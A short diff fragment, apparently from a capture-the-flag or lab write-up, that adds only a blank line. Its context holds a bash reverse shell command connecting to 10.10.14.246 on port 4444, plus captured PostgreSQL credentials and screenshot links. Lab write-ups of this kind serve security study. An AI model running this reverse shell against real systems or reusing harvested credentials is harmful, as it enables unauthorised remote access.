@@ -77,6 +77,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.246/4444 0>&1'
 <img width="755" height="242" alt="image" src="https://github.com/user-attachments/assets/a00f31e4-9d9c-4d5e-9024-90cb629b9e7e" />
 
 user=postgres
+
 password=P@s5w0rd!
 
 <img width="595" height="582" alt="image" src="https://github.com/user-attachments/assets/d7683759-dc82-4842-b55e-01e1e7da3048" />
